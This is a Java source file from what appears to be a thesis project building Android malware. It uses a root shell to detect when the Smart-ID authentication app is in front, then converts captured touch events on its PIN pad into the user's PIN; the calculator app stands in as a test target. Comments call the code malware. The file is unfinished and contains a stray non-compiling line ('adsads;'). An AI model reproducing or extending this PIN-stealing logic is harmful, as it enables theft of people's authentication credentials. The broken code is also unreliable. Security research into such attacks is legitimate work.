package com.example.thesis;

import android.util.Log;

import com.example.thesis.Buttons.Button;
import com.example.thesis.Buttons.CancelButton;
import com.example.thesis.Buttons.OkButton;
import com.example.thesis.Buttons.PinButton;
import com.example.thesis.Events.Event;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Deque;
import java.util.LinkedList;
import java.util.List;
import java.util.Queue;

/**
 * This class checks, if Smart-ID is the app in front.
 */
// TODO: rename class
public class SmartIDCheck {

    private Process rootProcess;
    private BufferedReader bufferedReaderInput;
    private BufferedReader bufferedReaderErrors;


    public SmartIDCheck() {
        this.rootProcess = ProcessManagerService.getRootProcess();
        this.bufferedReaderInput = new BufferedReader(new InputStreamReader(rootProcess.getInputStream()));
        this.bufferedReaderErrors = new BufferedReader(new InputStreamReader(rootProcess.getErrorStream()));  // TODO: make it read errors as well
}


    /**
     * Destroys the root process.
     */
    public void doStop() {
        rootProcess.destroy();
    }

    public DisplayedScreen getCurrentScreen() {
        return null;
    }


    /**
     * Checks whether the Smart-ID app is in front or not.
     * @return true if Smart-ID is in front, false if not.
     */
    public boolean isSmartIDInForeground() {
        adsads;
        // TODO: make it return screentype and have malware react accordingly
        String foregroundApp = getAppInForeground();
        if (foregroundApp.contains("com.android.calculator")) {
        // if (foregroundApp.contains("com.smart_id/com.stagnationlab.sk.TransactionActivity")) {
            getViewTree();
            return true;
        }
        return false;
        //return foregroundApp.contains("com.smart_id/com.stagnationlab.sk.TransactionActivity");
        // return foregroundApp.contains("com.android.calculator");
    }



    private String getAppInForeground() {
        // https://stackoverflow.com/questions/28543776/android-shell-get-foreground-app-package-name
        try {
            ProcessManagerService.sendCommand(rootProcess, "dumpsys window windows | grep \"mCurrentFocus\"");
            return bufferedReaderInput.readLine();
        } catch (Exception error) {
            Log.e("Smart-ID Check", "Error reading the dumpsys lines: " + error.getMessage());
        }
        return null;
    }


    public List<Button> getButtons() {
        // screencap /mnt/sdcard/Download/test.png
        List<Button> buttons = new ArrayList<>();

        // Pin buttons.
        int[] x_list = new int[]{202, 580, 958};
        for (int i = 0, y = 1375; i <= 9; i++) {
            if (i % 3 == 0 && i != 0) {
                y += 322;
            }

            Button pinButton = new PinButton(i + 1, 280, 280, x_list[i % 3], y);
            buttons.add(pinButton);
        }
        Button pinButton = new PinButton(0, 280, 280, x_list[1], 2341);
        buttons.add(pinButton);

        // Cancel and OK buttons.
        Button cancelButton = new CancelButton(175, 364, 153, 2393);
        Button okButton = new OkButton(175, 364, 923, 2393);
        Button deleteButton = null;
        buttons.add(cancelButton);
        buttons.add(okButton);

        return buttons;
    }


    /**
     * Below are the new functions.
     * TODO: depending on how it works, rename.
     */

    private char getViewTree() {
        // TODO
        Queue<String> outputLines = ProcessManagerService.readOutput("dumpsys activity top");
        // Queue<String> outputLines = ProcessManagerService.readOutput("uiautomator dump");

        Log.i("OUTPUT", outputLines.toString());
        return 'a';
        // cat /sdcard/window_dump.xml
    }

    private DisplayedScreen getScreenType() {
        //TODO
        return DisplayedScreen.AUTH_PIN_1;
    }

    /**
     * TODO: when auth_success, then this runs.
     * @return
     */
    public Queue<Integer> extractPIN(Queue<Event> touchEvents) {
        Deque<Integer> PIN = new LinkedList<>();
        Converter converter = new Converter();

        List<Button> buttons = getButtons();

        while (!touchEvents.isEmpty()) {
            Event touchEvent = touchEvents.poll();
            for (Button button : buttons) {
                boolean isInside = button.touchInsideButton(touchEvent, converter);
                if (isInside) {
                    if (button.getValue() == 1000) {
                        // OK button.
                    } else if (button.getValue() == -1000) {
                        // Cancel button.
                    } else if (button.getValue() == -50 && PIN.size() > 0) {
                        // Delete button.
                        PIN.removeLast();
                    } else {
                        // Numpad button.
                        PIN.add(button.getValue());
                    }
                }
            }
        }
        return PIN;
    }
}

enum DisplayedScreen {
    AUTH_PIN_1,
    // AUTH_PIN_1_FAILED,
    AUTH_PIN_2,
    // AUTH_PIN_2_FAILED,
    AUTH_SUCCESS,
    AUTH_FAILED,
    OTHER
}
